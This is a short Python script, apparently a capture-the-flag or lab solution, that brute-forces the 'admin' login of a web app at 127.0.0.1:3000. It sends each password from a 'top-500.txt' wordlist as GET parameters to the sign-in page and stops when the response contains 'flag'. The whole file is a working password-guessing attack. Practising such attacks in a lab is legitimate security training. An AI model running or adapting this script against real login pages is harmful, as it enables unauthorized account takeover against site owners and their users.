import requests

url = "http://127.0.0.1:3000/index.php?page=signin"
username = "admin"

with open("top-500.txt", "r") as file:
	for line in file:
		password = line.strip()
		print(f"Testing password: {password}")
		params = {
			"username": username,
			"password": password,
			"Login": "Login"
		}

		response = requests.get(url, params=params)
		if "flag" in response.text.lower():
			print(f"The password is: {password}")
			break